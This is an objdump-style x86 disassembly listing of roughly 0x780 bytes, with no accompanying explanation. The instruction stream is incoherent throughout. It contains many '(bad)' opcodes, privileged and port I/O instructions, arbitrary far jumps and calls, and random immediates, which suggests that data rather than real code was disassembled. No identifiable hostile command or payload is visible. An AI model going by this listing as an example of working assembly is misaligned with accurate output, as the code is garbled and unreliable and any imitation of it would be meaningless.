  41e66e:	pop    esi
  41e66f:	fld    DWORD PTR [eax-0x1a55766]
  41e675:	fbstp  TBYTE PTR [eax-0x5d242e87]
  41e67b:	push   esi
  41e67c:	mov    DWORD PTR [edi+0x24],edi
  41e67f:	pop    esp
  41e680:	fcomp  DWORD PTR [esi]
  41e682:	xchg   esi,eax
  41e683:	sar    DWORD PTR [ecx],cl
  41e685:	data16 fsubr st,st(2)
  41e688:	or     bh,BYTE PTR [esi-0x532b6009]
  41e68e:	in     eax,0xa2
  41e690:	cmovns esi,DWORD PTR [eax+ebp*8-0x70]
  41e695:	lock mov BYTE PTR [edi],cl
  41e698:	push   eax
  41e699:	loope  0x41e707
  41e69b:	mov    edi,0xc5f787c1
  41e6a0:	leave  
  41e6a1:	ror    DWORD PTR [ecx-0x7d],cl
  41e6a4:	xchg   esi,eax
  41e6a5:	mov    ecx,0x56849e87
  41e6aa:	sub    BYTE PTR [ebp+0x61],0x5c
  41e6ae:	dec    eax
  41e6af:	retf   
  41e6b0:	out    dx,al
  41e6b1:	std    
  41e6b2:	add    BYTE PTR [edi+0x119c3d2d],bh
  41e6b8:	and    al,0x1f
  41e6ba:	dec    eax
  41e6bb:	fwait
  41e6bc:	cwde   
  41e6bd:	push   es
  41e6be:	dec    esi
  41e6bf:	mov    ah,0x7d
  41e6c1:	mov    dl,0xe7
  41e6c3:	fdivr  QWORD PTR [esi-0x6a36e05b]
  41e6c9:	inc    edx
  41e6ca:	cld    
  41e6cb:	mov    esi,ebp
  41e6cd:	jno    0x41e742
  41e6cf:	sbb    cl,BYTE PTR [ebx+0xc0e8514]
  41e6d5:	fld    QWORD PTR [ebx]
  41e6d7:	xor    edi,edi
  41e6d9:	jne    0x41e678
  41e6db:	xchg   ecx,eax
  41e6dc:	cmp    eax,0x73adc88f
  41e6e1:	loopne 0x41e6f0
  41e6e3:	arpl   WORD PTR [esi+ebp*1],bx
  41e6e6:	imul   esp,DWORD PTR [ebp+0x5a810b0c],0x51
  41e6ed:	int    0xc7
  41e6ef:	icebp  
  41e6f0:	test   esp,ebx
  41e6f2:	xlat   BYTE PTR ds:[ebx]
  41e6f3:	lds    ebp,FWORD PTR [eax]
  41e6f5:	jmp    0x41e6f9
  41e6f7:	xchg   DWORD PTR [ebp+0x1c49715a],esp
  41e6fd:	or     BYTE PTR [eax+0x4c6d0c26],bl
  41e703:	ins    BYTE PTR es:[edi],dx
  41e704:	adc    eax,0x4afd3fa4
  41e709:	pop    ds
  41e70a:	pop    es
  41e70b:	and    eax,0x14c28956
  41e710:	call   0x58a8:0x777ceacb
  41e717:	mov    cr1,eax
  41e71a:	ins    DWORD PTR es:[edi],dx
  41e71b:	push   ebx
  41e71c:	and    DWORD PTR [edx+0x57],edx
  41e71f:	jne    0x41e704
  41e721:	ins    BYTE PTR es:[edi],dx
  41e722:	xchg   edi,eax
  41e723:	xor    eax,0xb85b213c
  41e728:	xchg   ebx,eax
  41e729:	xchg   ebp,eax
  41e72a:	mov    edx,esp
  41e72c:	dec    eax
  41e72d:	data16 fs cld 
  41e730:	sub    al,0xe7
  41e732:	inc    esi
  41e733:	dec    eax
  41e734:	jge    0x41e7a3
  41e736:	es pop esi
  41e738:	jmp    0xf8fe:0x46311036
  41e73f:	cli    
  41e740:	mov    DWORD PTR [ebx*1+0x4fc355cb],ebx
  41e747:	retf   0x1592
  41e74a:	adc    edi,0x3546c5ad
  41e750:	cmp    esp,DWORD PTR [ebx]
  41e752:	pop    es
  41e753:	mov    al,0x75
  41e755:	mov    cl,0xda
  41e757:	fld    TBYTE PTR [ebp-0x2870e0f5]
  41e75d:	and    ch,BYTE PTR [ebp+0x5c23c920]
  41e763:	loope  0x41e7ab
  41e765:	cmp    eax,0xbe8d371f
  41e76a:	aam    0xb0
  41e76c:	out    0x27,al
  41e76e:	stos   BYTE PTR es:[edi],al
  41e76f:	sub    eax,0xe75dc232
  41e774:	(bad)  
  41e775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e776:	xor    ch,dh
  41e778:	inc    edi
  41e779:	pop    es
  41e77a:	xchg   esp,eax
  41e77b:	xchg   ebx,eax
  41e77c:	into   
  41e77d:	inc    ebp
  41e77e:	add    al,0x3d
  41e780:	jmp    0x41e750
  41e782:	push   edx
  41e783:	leave  
  41e784:	repnz lds esp,FWORD PTR [eax+0x4e013be1]
  41e78b:	clc    
  41e78c:	mov    esi,0x13ad3c7f
  41e791:	cmp    eax,0x195a29cb
  41e796:	repz jl 0x41e775
  41e799:	mov    esi,0xd044f8a5
  41e79e:	test   eax,0x934682ee
  41e7a3:	cmp    BYTE PTR [edx+ecx*2],dl
  41e7a6:	pop    ds
  41e7a7:	mov    ds:0x277dfb08,al
  41e7ac:	pusha  
  41e7ad:	add    bl,BYTE PTR [ebx-0x5532ee80]
  41e7b3:	cmp    DWORD PTR [edx],eax
  41e7b5:	shl    DWORD PTR [esi+0x4a],cl
  41e7b8:	dec    edi
  41e7b9:	mov    al,ds:0x2a7fdad9
  41e7be:	ss push es
  41e7c0:	or     BYTE PTR [esi+ebx*4+0x5776ebe1],ch
  41e7c7:	add    BYTE PTR [eax+0x8],ah
  41e7ca:	gs push edx
  41e7cc:	pop    ecx
  41e7cd:	or     ch,BYTE PTR [edi-0x60a807f6]
  41e7d3:	jle    0x41e7fd
  41e7d5:	jae    0x41e84a
  41e7d7:	stc    
  41e7d8:	mov    ds:0x97f58e39,eax
  41e7dd:	icebp  
  41e7de:	or     ecx,ebx
  41e7e0:	popf   
  41e7e1:	or     DWORD PTR [ebp+0x7bf8d861],esi
  41e7e7:	xchg   ebp,eax
  41e7e8:	clc    
  41e7e9:	inc    ebx
  41e7ea:	jno    0x41e78b
  41e7ec:	ret    
  41e7ed:	test   DWORD PTR [eax-0x5e],0x4ea49c3a
  41e7f4:	les    edi,FWORD PTR [ecx]
  41e7f6:	sar    BYTE PTR [edx+0x2e],1
  41e7f9:	test   al,0xdf
  41e7fb:	sahf   
  41e7fc:	jmp    0x41e7fb
  41e7fe:	xor    eax,0xa661a9ca
  41e803:	push   ss
  41e804:	xchg   bh,cl
  41e806:	int    0x9e
  41e808:	sti    
  41e809:	int    0x59
  41e80b:	in     al,0x4f
  41e80d:	js     0x41e872
  41e80f:	dec    edx
  41e810:	dec    ecx
  41e811:	cmp    edi,DWORD PTR [edx-0x45]
  41e814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e815:	jle    0x41e889
  41e817:	cmp    DWORD PTR [edx+0x3bf6e0bb],ecx
  41e81d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e81e:	pushf  
  41e81f:	mov    dh,0x13
  41e821:	add    DWORD PTR [eax-0x77],edx
  41e824:	inc    edx
  41e825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e826:	xchg   esp,eax
  41e827:	(bad)  
  41e828:	popf   
  41e829:	sar    DWORD PTR [edi-0x66b63784],0xed
  41e830:	inc    edx
  41e831:	fldenv [edx]
  41e833:	adc    eax,0x9ff8b349
  41e838:	pusha  
  41e839:	(bad)  
  41e83a:	jl     0x41e85c
  41e83c:	pop    ds
  41e83d:	js     0x41e868
  41e83f:	in     eax,0x77
  41e841:	stc    
  41e842:	and    BYTE PTR [edx+0x20bc5999],cl
  41e848:	or     al,0xaa
  41e84a:	inc    edx
  41e84b:	jl     0x41e7e8
  41e84d:	das    
  41e84e:	stos   DWORD PTR es:[edi],eax
  41e84f:	mov    ?,WORD PTR [ecx+0x0]
  41e852:	scas   eax,DWORD PTR es:[edi]
  41e853:	rcr    DWORD PTR [eax+0x37],0x89
  41e857:	inc    eax
  41e858:	pop    eax
  41e859:	pop    esp
  41e85a:	sbb    al,0xc
  41e85c:	leave  
  41e85d:	ins    BYTE PTR es:[edi],dx
  41e85e:	mov    dh,0xd6
  41e860:	mov    esi,0xe79422e
  41e865:	adc    DWORD PTR [eax+0xa],0x9750eeda
  41e86c:	xchg   edx,eax
  41e86d:	pop    eax
  41e86e:	loope  0x41e878
  41e870:	pop    ds
  41e871:	es dec ebx
  41e873:	int3   
  41e874:	ss xchg si,ax
  41e877:	aas    
  41e878:	mov    edx,0xe5fd8836
  41e87d:	test   dh,dh
  41e87f:	test   BYTE PTR [esi+eax*8-0x1b177250],dl
  41e886:	mov    ah,0x56
  41e888:	inc    edi
  41e889:	arpl   WORD PTR [esi-0x17],cx
  41e88c:	into   
  41e88d:	(bad)  [ecx]
  41e88f:	fadd   DWORD PTR [esp+eiz*8]
  41e892:	cmp    al,0xd9
  41e894:	xlat   BYTE PTR ds:[ebx]
  41e895:	sub    eax,0xe519f3af
  41e89a:	jae    0x41e8fe
  41e89c:	adc    al,0xbf
  41e89e:	adc    BYTE PTR [ebx+0x1f],al
  41e8a1:	retf   
  41e8a2:	pop    eax
  41e8a3:	in     eax,0x19
  41e8a5:	lods   al,BYTE PTR ds:[esi]
  41e8a6:	or     dh,BYTE PTR [ecx+0x3]
  41e8a9:	jne    0x41e8f4
  41e8ab:	mov    al,0x95
  41e8ad:	imul   ecx,DWORD PTR [edx-0x5b23369e],0x84a923c8
  41e8b7:	lods   al,BYTE PTR ds:[esi]
  41e8b8:	aad    0xce
  41e8ba:	cmp    eax,0x8e2535d3
  41e8bf:	inc    edi
  41e8c0:	fwait
  41e8c1:	dec    ebp
  41e8c2:	jmp    0x7daa:0xa930ee8
  41e8c9:	lea    esp,es:[edi+0x71d004c9]
  41e8d0:	push   cs
  41e8d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8d2:	int    0xf
  41e8d4:	mov    ebx,0x6b0b774d
  41e8d9:	push   ecx
  41e8da:	sub    bh,BYTE PTR [edi-0x6c]
  41e8dd:	leave  
  41e8de:	add    cl,bl
  41e8e0:	mov    edx,0x3326cd07
  41e8e5:	fld    DWORD PTR [esi+0x33fc6ff3]
  41e8eb:	dec    eax
  41e8ec:	adc    ah,BYTE PTR [edi]
  41e8ee:	xor    eax,0x650e0314
  41e8f3:	scas   al,BYTE PTR es:[edi]
  41e8f4:	xor    al,0xbc
  41e8f6:	daa    
  41e8f7:	fisub  WORD PTR [edi+0x17e72c08]
  41e8fd:	out    0x4d,al
  41e8ff:	add    BYTE PTR [esi+edi*2-0x1aa672ad],bh
  41e906:	or     DWORD PTR [edx],edx
  41e908:	std    
  41e909:	pop    es
  41e90a:	cdq    
  41e90b:	and    DWORD PTR [ebx+0x30],edi
  41e90e:	(bad)  
  41e90f:	lahf   
  41e910:	jge    0x41e896
  41e912:	outs   dx,BYTE PTR ds:[esi]
  41e913:	mov    esi,0x77cfd2f1
  41e918:	mov    ah,0x3c
  41e91a:	jo     0x41e977
  41e91c:	lods   al,BYTE PTR ds:[esi]
  41e91d:	xchg   ebx,eax
  41e91e:	test   DWORD PTR fs:[esi],edi
  41e921:	and    ecx,DWORD PTR [ebp+0x7abf731]
  41e927:	pop    ecx
  41e928:	mov    al,0x9c
  41e92a:	inc    edx
  41e92b:	call   0x517ca7a
  41e930:	jp     0x41e931
  41e932:	inc    eax
  41e933:	int3   
  41e934:	enter  0x213a,0x89
  41e938:	jmp    0x41e91a
  41e93a:	dec    esp
  41e93b:	mov    dl,0x6
  41e93d:	fcom   QWORD PTR [edx]
  41e93f:	or     al,BYTE PTR [ebx+0x20d2e889]
  41e945:	stos   BYTE PTR es:[edi],al
  41e946:	retf   
  41e947:	dec    esi
  41e948:	add    BYTE PTR [edx-0x520130c1],ah
  41e94e:	arpl   WORD PTR [ebx+0x21ac06fc],sp
  41e954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e955:	cmp    edi,esi
  41e957:	pop    es
  41e958:	push   edx
  41e959:	mov    ecx,0x14a5fab6
  41e95e:	aad    0x3b
  41e960:	je     0x41e970
  41e962:	xor    BYTE PTR [edx-0x6e],cl
  41e965:	mov    WORD PTR [ebx+0x678e226b],fs
  41e96b:	shl    DWORD PTR [edx],0x72
  41e96e:	push   edi
  41e96f:	mov    ecx,0x49b493bf
  41e974:	adc    ebp,esp
  41e976:	inc    ecx
  41e977:	push   ds
  41e978:	pusha  
  41e979:	test   eax,0x3f2c3543
  41e97e:	leave  
  41e97f:	repnz adc al,0xa7
  41e982:	mov    eax,0x7ffba8c1
  41e987:	adc    eax,0x746fb33d
  41e98c:	scas   eax,DWORD PTR es:[edi]
  41e98d:	je     0x41e9f5
  41e98f:	pop    esp
  41e990:	out    dx,eax
  41e991:	push   ebx
  41e992:	ins    DWORD PTR es:[edi],dx
  41e993:	inc    esp
  41e994:	or     dh,BYTE PTR [esi]
  41e996:	aam    0xf
  41e998:	sub    al,cl
  41e99a:	mov    dh,0x7a
  41e99c:	fistp  WORD PTR [edx+0x45]
  41e99f:	xor    esi,DWORD PTR [ecx+0x39]
  41e9a2:	push   esp
  41e9a3:	pop    ecx
  41e9a4:	cmp    DWORD PTR [ebx],edi
  41e9a6:	add    al,0x49
  41e9a8:	ss ja  0x41e9ca
  41e9ab:	aad    0xfc
  41e9ad:	and    DWORD PTR [esi+0x6e80fdf7],esi
  41e9b3:	adc    BYTE PTR [edx],dl
  41e9b5:	push   esp
  41e9b6:	test   al,0x33
  41e9b8:	jmp    0x41e977
  41e9ba:	mov    edx,0x11841450
  41e9bf:	test   DWORD PTR [esi],esi
  41e9c1:	ss mov ebp,0xedab9cdd
  41e9c7:	gs sahf 
  41e9c9:	shl    ch,0xf
  41e9cc:	mov    cl,0xee
  41e9ce:	ja     0x41e9f9
  41e9d0:	xchg   ecx,eax
  41e9d1:	std    
  41e9d2:	mov    ?,WORD PTR [esi-0x46]
  41e9d5:	xor    DWORD PTR [edx],0xffffffa9
  41e9d8:	sub    esp,eax
  41e9da:	sub    bh,cl
  41e9dc:	pop    eax
  41e9dd:	xchg   eax,edi
  41e9df:	dec    dx
  41e9e1:	xchg   esp,eax
  41e9e2:	sbb    ah,dh
  41e9e4:	stc    
  41e9e5:	out    dx,al
  41e9e6:	ins    BYTE PTR es:[edi],dx
  41e9e7:	dec    esp
  41e9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9e9:	sahf   
  41e9ea:	mov    eax,ds:0x1558ccda
  41e9ef:	pop    ebp
  41e9f0:	fisttp WORD PTR ds:0xa6d8b35e
  41e9f6:	pop    ds
  41e9f7:	pop    ebx
  41e9f8:	adc    al,0x72
  41e9fa:	cmp    ebp,DWORD PTR [edi]
  41e9fc:	mov    eax,ds:0xe4a92e03
  41ea01:	addr16 sahf 
  41ea03:	sar    DWORD PTR [esi],cl
  41ea05:	loopne 0x41ea43
  41ea07:	jno    0x41ea85
  41ea09:	(bad)  
  41ea0a:	int3   
  41ea0b:	jg     0x41e9a6
  41ea0d:	fmulp  st(7),st
  41ea0f:	and    ch,BYTE PTR [ecx-0x3fbaa1cb]
  41ea15:	mov    ecx,0xddb10bd3
  41ea1a:	(bad)  
  41ea1b:	pop    edi
  41ea1c:	shl    DWORD PTR [edx-0x54],1
  41ea1f:	arpl   WORD PTR [eax],dx
  41ea21:	fist   WORD PTR [eax-0x9dd32d9]
  41ea27:	imul   edx,DWORD PTR [ebp+0x64103e66],0xffffffb9
  41ea2e:	sbb    eax,DWORD PTR [edi+ebp*1+0x621c9b0]
  41ea35:	hlt    
  41ea36:	sub    dh,BYTE PTR [edi+ebp*8+0x51]
  41ea3a:	pop    ebx
  41ea3b:	and    DWORD PTR [eax],esp
  41ea3d:	jnp    0x41ea17
  41ea3f:	cmc    
  41ea40:	jge    0x41ea1c
  41ea42:	mov    WORD PTR [eax-0x38],ss
  41ea45:	xchg   ebx,eax
  41ea46:	stc    
  41ea47:	push   edx
  41ea48:	or     DWORD PTR [ebx-0x29ccdd0e],edi
  41ea4e:	or     al,0xd0
  41ea50:	jb     0x41ea23
  41ea52:	out    dx,al
  41ea53:	push   0xffffff8d
  41ea55:	xor    DWORD PTR [ebx-0x6b8951f0],eax
  41ea5b:	sub    eax,0x99530d0
  41ea60:	call   DWORD PTR [ecx+0x45a0b42c]
  41ea66:	push   edi
  41ea67:	mov    bl,0xbe
  41ea69:	xchg   esi,eax
  41ea6a:	in     eax,0x15
  41ea6c:	(bad)  
  41ea6e:	cmp    BYTE PTR [edi+ebp*8+0x7cc8aaf2],ch
  41ea75:	lock sub ebp,esi
  41ea78:	pop    eax
  41ea79:	fisttp WORD PTR ds:0x97d5e608
  41ea7f:	cmp    al,0x84
  41ea81:	addr16 push es
  41ea83:	xchg   ebp,eax
  41ea84:	sub    esp,ebp
  41ea86:	push   es
  41ea87:	mov    ecx,0x89bbbc7e
  41ea8c:	test   eax,0x18bbc5b6
  41ea91:	aaa    
  41ea92:	xchg   edx,eax
  41ea93:	add    DWORD PTR [edi+edx*4+0x449d7d89],ebp
  41ea9a:	dec    ebx
  41ea9b:	sbb    eax,0x7271c156
  41eaa0:	lahf   
  41eaa1:	outs   dx,BYTE PTR ds:[esi]
  41eaa2:	add    BYTE PTR [esp+eax*4],cl
  41eaa5:	jo     0x41ea6f
  41eaa7:	sbb    ah,BYTE PTR [ecx+0x3dec6ceb]
  41eaad:	lods   al,BYTE PTR ds:[esi]
  41eaae:	xor    BYTE PTR [eax+0x5a67f454],dh
  41eab4:	not    DWORD PTR [edi+0x2b]
  41eab7:	push   es
  41eab8:	lds    edi,FWORD PTR fs:[ebp-0x42]
  41eabc:	fs fcomi st,st(5)
  41eabf:	or     dl,BYTE PTR [esi]
  41eac1:	add    eax,DWORD PTR [ebx+0xefbcb6a]
  41eac7:	mov    bl,0xe4
  41eac9:	dec    esp
  41eaca:	jle    0x41ea87
  41eacc:	in     al,0x40
  41eace:	repz cmp al,0x7b
  41ead1:	iret   
  41ead2:	mov    esp,0xdc7c62ea
  41ead7:	je     0x41eafc
  41ead9:	(bad)
  41eade:	push   edi
  41eadf:	fwait
  41eae0:	fs mov bh,0x76
  41eae3:	sti    
  41eae4:	pop    edi
  41eae5:	dec    esi
  41eae6:	lds    eax,FWORD PTR [ebx]
  41eae8:	and    al,BYTE PTR [ecx-0x2d]
  41eaeb:	mov    dh,0xfb
  41eaed:	push   esp
  41eaee:	jle    0x41eb63
  41eaf0:	jne    0x41eb50
  41eaf2:	fst    QWORD PTR [eax]
  41eaf4:	cmp    al,0xb8
  41eaf6:	inc    edi
  41eaf7:	inc    esi
  41eaf8:	or     BYTE PTR [edi],0x42
  41eafb:	mov    ds:0x8d17e94e,eax
  41eb00:	retf   0x77d3
  41eb03:	xor    eax,DWORD PTR ds:0x17b36dc0
  41eb09:	push   ebp
  41eb0a:	inc    edx
  41eb0b:	idiv   BYTE PTR [edi]
  41eb0d:	bound  edx,QWORD PTR [edi+edx*1]
  41eb10:	arpl   WORD PTR [ecx+ecx*1+0x34],bx
  41eb14:	jmp    0x818d:0x7cffe09f
  41eb1b:	loope  0x41eb53
  41eb1d:	sbb    BYTE PTR [eax+0x12],0x61
  41eb21:	mov    dl,0x81
  41eb23:	and    DWORD PTR [eax+0xe61a5f1],eax
  41eb29:	(bad)  
  41eb2a:	data16 and cl,BYTE PTR [ebp+0x57]
  41eb2e:	call   0x241:0xf7475f58
  41eb35:	div    BYTE PTR gs:[eax+ecx*2-0x71e29f48]
  41eb3d:	sahf   
  41eb3e:	inc    ebp
  41eb3f:	fwait
  41eb40:	sub    BYTE PTR [esp+ebp*8+0x438c2026],dh
  41eb47:	sbb    eax,0x8fa45f6b
  41eb4c:	or     al,0x6e
  41eb4e:	cmp    BYTE PTR [ecx+0x66ad2519],bl
  41eb54:	xchg   esi,eax
  41eb55:	or     al,0x1e
  41eb57:	jge    0x41ebbc
  41eb59:	inc    edi
  41eb5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb5b:	cmp    eax,0xc4561580
  41eb60:	mov    ebp,0xd8b0b577
  41eb65:	out    0xd5,al
  41eb67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb68:	fld    QWORD PTR ds:0x45fc
  41eb6d:	and    ah,BYTE PTR [ecx+0x4308bba3]
  41eb73:	add    DWORD PTR [ebx-0x6],0x49
  41eb77:	add    al,0x72
  41eb79:	push   ecx
  41eb7a:	(bad)  
  41eb7c:	sub    ah,BYTE PTR [ebp-0x7cee957f]
  41eb82:	push   eax
  41eb83:	and    eax,0x1203d01
  41eb88:	stos   DWORD PTR es:[edi],eax
  41eb89:	(bad)  
  41eb8a:	fdiv   DWORD PTR [edx-0x5599a24]
  41eb90:	retf   
  41eb91:	arpl   WORD PTR [ebp-0x2f4dc256],cx
  41eb97:	in     eax,0xa3
  41eb99:	mov    ss,eax
  41eb9b:	push   eax
  41eb9c:	daa    
  41eb9d:	mov    dh,0x48
  41eb9f:	cmp    al,0x89
  41eba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eba2:	jp     0x41ebd0
  41eba4:	jle    0x41eb43
  41eba6:	sub    ah,BYTE PTR [edi]
  41eba8:	dec    edx
  41eba9:	dec    ecx
  41ebaa:	fucomi st,st(0)
  41ebac:	nop
  41ebad:	inc    ebx
  41ebae:	xchg   ebp,eax
  41ebaf:	sbb    ecx,DWORD PTR [ebp-0x7e]
  41ebb2:	dec    ebp
  41ebb3:	test   al,0xa2
  41ebb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebb6:	cmc    
  41ebb7:	ds aaa 
  41ebb9:	jns    0x41ebee
  41ebbb:	jae    0x41ec06
  41ebbd:	mov    esi,0xfc6c3eb9
  41ebc2:	jb     0x41eb6f
  41ebc4:	xchg   dh,dl
  41ebc6:	and    DWORD PTR [esi+0x8a8c56f],ecx
  41ebcc:	sbb    esp,esp
  41ebce:	pop    ss
  41ebcf:	sub    eax,0x1f486370
  41ebd4:	jbe    0x41ec35
  41ebd6:	es ja  0x41ec04
  41ebd9:	cmp    eax,0x18b77f3e
  41ebde:	out    dx,eax
  41ebdf:	popa   
  41ebe0:	and    edx,eax
  41ebe2:	(bad)  
  41ebe3:	fld    DWORD PTR [ebx]
  41ebe5:	into   
  41ebe6:	lahf   
  41ebe7:	push   edx
  41ebe8:	inc    esi
  41ebe9:	test   BYTE PTR [edi+ecx*4],bh
  41ebec:	pop    edx
  41ebed:	inc    ebx
  41ebee:	in     eax,dx
  41ebef:	mov    al,0x57
  41ebf1:	add    DWORD PTR [ecx*1-0x3e930a3c],0xffffff97
  41ebf9:	pop    edx
  41ebfa:	adc    ch,0x55
  41ebfd:	push   0x6d90b356
  41ec02:	push   ebp
  41ec03:	jecxz  0x41ebe6
  41ec05:	sahf   
  41ec06:	mov    eax,ds:0x475e90a4
  41ec0b:	(bad)  
  41ec0c:	fadd   st(3),st
  41ec0e:	cld    
  41ec0f:	pop    ebp
  41ec10:	jmp    0x4d75fc4b
  41ec15:	dec    ebp
  41ec16:	push   ebx
  41ec17:	sbb    al,0x46
  41ec19:	push   ebp
  41ec1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec1b:	push   esp
  41ec1c:	mov    edi,0xe79c286b
  41ec21:	out    dx,al
  41ec22:	jbe    0x41eba9
  41ec24:	sub    bl,BYTE PTR ds:0x785df9f3
  41ec2a:	call   DWORD PTR [edx+0x4854a15]
  41ec30:	jmp    0x41eca7
  41ec32:	xchg   ebx,eax
  41ec33:	cmp    al,0xc9
  41ec35:	pop    ebx
  41ec36:	lea    esi,[ebx+ebx*8+0x6edc7171]
  41ec3d:	adc    bh,BYTE PTR [ecx-0x7a]
  41ec40:	les    edx,FWORD PTR [ebp+0x543a7be7]
  41ec46:	ins    BYTE PTR es:[edi],dx
  41ec47:	pop    es
  41ec48:	mov    edx,0x3525ad40
  41ec4d:	and    dh,BYTE PTR [ebx-0x7600e6d5]
  41ec53:	or     eax,0x548ea5b8
  41ec58:	in     al,0xe0
  41ec5a:	mov    cl,0x5b
  41ec5c:	add    eax,0x62d5c594
  41ec61:	mov    cl,0xdc
  41ec63:	fbstp  TBYTE PTR [edi-0x48]
  41ec66:	in     eax,0xb4
  41ec68:	in     eax,dx
  41ec69:	outs   dx,BYTE PTR ds:[esi]
  41ec6a:	pop    edx
  41ec6b:	aaa    
  41ec6c:	jo     0x41ec94
  41ec6e:	dec    esi
  41ec6f:	and    BYTE PTR [eax-0xe107eb1],cl
  41ec75:	ins    BYTE PTR es:[edi],dx
  41ec76:	pop    es
  41ec77:	xchg   esi,eax
  41ec78:	and    BYTE PTR [eax+esi*8],bh
  41ec7b:	push   es
  41ec7c:	xchg   BYTE PTR [eax],bl
  41ec7e:	push   eax
  41ec7f:	fistp  WORD PTR [esi+0xd9c053]
  41ec85:	test   al,0x68
  41ec87:	jns    0x41ec3b
  41ec89:	fisubr DWORD PTR ds:0xef5b3890
  41ec8f:	in     al,dx
  41ec90:	jno    0x41ed0c
  41ec92:	or     eax,0xe9bbb0
  41ec97:	arpl   WORD PTR [eax],bp
  41ec99:	rcr    BYTE PTR [esi-0x28aba8b2],1
  41ec9f:	out    dx,al
  41eca0:	adc    DWORD PTR [esi-0x54b6982],esp
  41eca6:	std    
  41eca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eca8:	lea    di,es:[edi-0x7e]
  41ecad:	inc    edi
  41ecae:	cs inc ecx
  41ecb0:	je     0x41ec35
  41ecb2:	inc    eax
  41ecb3:	dec    esi
  41ecb4:	xchg   edx,eax
  41ecb5:	fdiv   st,st(4)
  41ecb7:	inc    eax
  41ecb8:	mov    eax,ds:0xe1c966f1
  41ecbd:	ficom  DWORD PTR [ecx+edi*1-0x654cf667]
  41ecc4:	sbb    BYTE PTR [edx-0x70853b41],0x29
  41eccb:	int    0x2a
  41eccd:	test   al,0x39
  41eccf:	or     al,0x42
  41ecd1:	mov    edx,0x96cc7d27
  41ecd6:	add    BYTE PTR [ebp*4-0x53435995],al
  41ecdd:	add    dl,ch
  41ecdf:	push   es
  41ece0:	jmp    0x2acf:0x3096e82e
  41ece7:	cmp    al,0xc5
  41ece9:	arpl   WORD PTR [esi-0x1f],bx
  41ecec:	jne    0x41ec99
  41ecee:	outs   dx,DWORD PTR ds:[esi]
  41ecef:	loopne 0x41ec86
  41ecf1:	sub    al,0x78
  41ecf3:	outs   dx,BYTE PTR ds:[esi]
  41ecf4:	push   ebp
  41ecf5:	sbb    al,0xde
  41ecf7:	sbb    al,BYTE PTR [eax]
  41ecf9:	(bad)
  41ecfd:	or     eax,0x9f5a80c6
  41ed02:	jne    0x41ecab
  41ed04:	inc    ebx
  41ed05:	enter  0xda6,0xac
  41ed09:	add    eax,0xf9039ee7
  41ed0e:	(bad)  [esp+ebp*1-0x27]
  41ed12:	fisubr WORD PTR ds:0xee62a089
  41ed18:	pop    edx
  41ed19:	lock jecxz 0x41ed87
  41ed1c:	mov    WORD PTR ds:0x7a33057d,fs
  41ed22:	push   ebx
  41ed23:	mov    ecx,esi
  41ed25:	ins    DWORD PTR es:[edi],dx
  41ed26:	scas   eax,DWORD PTR es:[edi]
  41ed27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed28:	adc    al,0xd4
  41ed2a:	cmp    BYTE PTR [eax-0x463f759a],ch
  41ed30:	sbb    BYTE PTR [edi+edi*8-0x2a397b19],bh
  41ed37:	dec    ebx
  41ed38:	jne    0x41ecfe
  41ed3a:	dec    ebp
  41ed3b:	shl    DWORD PTR [edi-0x74c2b33c],cl
  41ed41:	adc    al,0x29
  41ed43:	(bad)  
  41ed45:	xor    BYTE PTR [ebp+0x13],al
  41ed48:	jmp    0xcacb2a36
  41ed4d:	mov    ebx,0x88d16f7c
  41ed52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed53:	or     bl,cl
  41ed55:	mov    al,0xe8
  41ed57:	and    ebx,0x33
  41ed5a:	addr16 mov edx,fs
  41ed5d:	hlt    
  41ed5e:	in     eax,0x8b
  41ed60:	in     al,dx
  41ed61:	mov    ebp,0x7cd17b59
  41ed66:	mov    dl,0xf3
  41ed68:	outs   dx,BYTE PTR ds:[esi]
  41ed69:	lahf   
  41ed6a:	sub    edi,DWORD PTR [ebx*8-0x367602d1]
  41ed71:	push   esp
  41ed72:	outs   dx,DWORD PTR ds:[esi]
  41ed73:	popf   
  41ed74:	outs   dx,DWORD PTR ds:[esi]
  41ed75:	seta   BYTE PTR [ebp+edx*4-0x7bcad6d3]
  41ed7d:	sub    eax,0x849dca49
  41ed82:	sbb    ah,BYTE PTR ds:0xc09a0791
  41ed88:	pop    esp
  41ed89:	jl     0x41ed1b
  41ed8b:	push   es
  41ed8c:	push   esi
  41ed8d:	sbb    al,0x43
  41ed8f:	push   esp
  41ed90:	daa    
  41ed91:	ins    DWORD PTR es:[edi],dx
  41ed92:	cwde   
  41ed93:	in     al,dx
  41ed94:	js     0x41ee11
  41ed96:	ins    BYTE PTR es:[edi],dx
  41ed97:	mov    esp,DWORD PTR [ebp+0x54fd919]
  41ed9d:	jecxz  0x41ee05
  41ed9f:	ret    0x46ac
  41eda2:	xor    al,BYTE PTR [eax-0x2012969a]
  41eda8:	cmp    ah,BYTE PTR [ecx]
  41edaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edab:	sub    eax,0xd393f688
  41edb0:	mov    cl,bh
  41edb2:	out    dx,ax
  41edb4:	jmp    0x8183:0xff3b0932
  41edbb:	jmp    0x41edee
  41edbd:	xor    ebx,DWORD PTR [eax+edx*2-0x769d2d0b]
  41edc4:	jp     0x41ed59
  41edc6:	nop
  41edc7:	je     0x41edc8
  41edc9:	scas   al,BYTE PTR es:[edi]
  41edca:	cmp    eax,0xcfa644c3
  41edcf:	cmp    eax,0x4c3c87d3
  41edd4:	daa    
  41edd5:	fld    DWORD PTR [eax+0xa1be077]
  41eddb:	(bad)  
  41eddd:	ror    DWORD PTR [edx+0x34],1
